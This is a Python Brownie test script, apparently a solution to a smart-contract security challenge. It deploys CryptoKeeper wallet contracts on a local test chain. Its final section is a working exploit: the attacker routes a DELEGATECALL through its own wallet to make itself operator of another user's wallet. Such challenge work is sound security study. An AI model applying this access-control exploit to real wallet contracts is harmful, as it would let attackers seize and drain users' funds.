from web3 import Web3
from brownie import web3, reverts, accounts, CryptoKeeper, CryptoKeeperFactory, RentingLibraryAttacker, Wei, DummyERC20, chain, interface
from time import sleep
#import brownie
import pytest
from eth_abi import encode_abi

#@pytest.fixture
def test_deploy():
    yellow ='\x1b[0;33m'
    green ='\x1b[0;32m'
    red='\x1b[0;31m'
    nocolor='\x1b[0;m'

    INITIAL_SUPPLY = Wei('1000 ether')
    DAILY_RENT_PRICE = Wei('50 ether')
    ATTACKER_INITIAL_BALANCE = Wei('100 ether')
    INITIAL_BALANCE = Wei('10 ether')
    CALL_OPERATION = 1

    [deployer, user1, user2, user3, attacker] = accounts[:5]

    # Adding 100 accounts
    print(red,"\r[ * ] \x1b[0;43m0xm4ud CALL Attacker 3000\x1b[0;m")
    print(red,"\r[ * ]\x1b[0;m RICKY BOBBY says: I WANNA CALL FAST!!!",nocolor)

    # Web3 instance
    w3 = Web3(Web3.HTTPProvider())

    #Deploy RainbowAllianceToken
    print(green,"\r[ + ]\x1b[0;m Deploying Token, CryptoKeeperTemplate and CryptoKeeperFactorty",nocolor)
    # deploying the token
    token = DummyERC20.deploy("Dummy ERC20", "DToken", INITIAL_SUPPLY,{'from': deployer})
    # deploying the CryptoKeeperTemplate
    cryptoKeeperTemplate = CryptoKeeper.deploy({'from': deployer, 'gas_price': 0x4133110a0})
    # deploying the CryptoKeeperFactory
    cryptoKeeperFactory = CryptoKeeperFactory.deploy(deployer.address, cryptoKeeperTemplate.address, {'from': deployer, 'gas_price': 0x4133110a0})

    # User1 creates a CryptoKeeper
    User1Salt = web3.keccak(bytes (user1.address, 'utf-8'))
    # OR like this
    ##User1Salt = keccak(bytes(acct1.address.encode('utf-8'))).hex()
    # OR like this
    ##User1Salt = "0x"+ keccak(bytes(acct1.address).encode('utf-8')).hex()
    cryptoKeeper1Address = cryptoKeeperFactory.predictCryptoKeeperAddress(User1Salt, {'from': user1})
    cryptoKeeperFactory.createCryptoKeeper(User1Salt, [user1.address],{'from': user1})
    cryptoKeeper1 = CryptoKeeper.at(cryptoKeeper1Address)

    # User2 creates a CryptoKeeper
    User2Salt = web3.keccak(bytes (user2.address, 'utf-8'))
    cryptoKeeper2Address = cryptoKeeperFactory.predictCryptoKeeperAddress(User2Salt, {'from': user2})
    cryptoKeeperFactory.createCryptoKeeper(User2Salt, [user2.address],{'from': user2})
    cryptoKeeper2 = CryptoKeeper.at(cryptoKeeper2Address)

    # User3 creates a CryptoKeeper
    User3Salt = web3.keccak(bytes (user3.address, 'utf-8'))
    cryptoKeeper3Address = cryptoKeeperFactory.predictCryptoKeeperAddress(User3Salt, {'from': user3})
    cryptoKeeperFactory.createCryptoKeeper(User3Salt, [user3.address],{'from': user3})
    cryptoKeeper3 = CryptoKeeper.at(cryptoKeeper3Address)

    # Users load their cryptoKeepers with some ether
    user1.transfer(cryptoKeeper1.address, INITIAL_BALANCE)
    user2.transfer(cryptoKeeper2Address, INITIAL_BALANCE)
    user3.transfer(cryptoKeeper3Address, INITIAL_BALANCE)

    # CryptoKeeper operation works
    cryptoKeeper1.executeWithValue(user2.address, "0x", '1 ether', {'from': user1, 'value': '1 ether'})
    cryptoKeeper2.executeWithValue(user1.address, "0x", '1 ether', {'from': user2, 'value': '1 ether'})
    cryptoKeeper3.executeWithValue(user1.address, "0x", '1 ether', {'from': user3, 'value': '1 ether'})

    # Only operator can manage the wallet
    # addOperator fails
    with reverts("Not an operator"):
        assert(cryptoKeeper1.addOperator(user2.address, {'from': user2}))
    # executeWithValue fails
    with reverts("Not an operator"):
        assert(cryptoKeeper1.executeWithValue(user2.address, "0x", '1 ether', {'from': user2, 'value': '1 ether'}))
    # execute fails

    # Manually create calldata
    ###calldata = list(interface.DummyERC20.selectors.keys())[list(interface.DummyERC20.selectors.values()).index("balanceOf")] + encode_abi(['address'], [deployer.address]).hex()
    # OR like this
    ###TokenFactory_contract=w3.eth.contract(abi=DummyERC20.abi)
    ###calldata = TokenFactory_contract.encodeABI(fn_name='balanceOf', args=[deployer.address])
    # OR like this (below is a more elegant way to do it)
    calldata = token.balanceOf.encode_input(deployer.address)

    with reverts("Not an operator"):
        assert(cryptoKeeper1.execute(token.address, calldata, CALL_OPERATION,{'from': user2}))
    
    attackerInitialBalance = attacker.balance()





    # Exploit time
    AttackerSalt = web3.keccak(bytes (attacker.address, 'utf-8'))
    cryptoKeeperAttackerAddress = cryptoKeeperFactory.predictCryptoKeeperAddress(AttackerSalt, {'from': attacker})
    cryptoKeeperFactory.createCryptoKeeper(AttackerSalt, [attacker.address],{'from': attacker})
    attackerKeeper = CryptoKeeper.at(cryptoKeeperAttackerAddress)

    calldata = cryptoKeeper1.addOperator.encode_input(attacker.address)
    calldata2 = cryptoKeeper1.execute.encode_input(cryptoKeeper2Address, calldata, 2)
    CALL_OPERATION = 2 # DELEGATECALL
    attackerKeeper.execute(cryptoKeeper1, calldata2, CALL_OPERATION, {'from': attacker})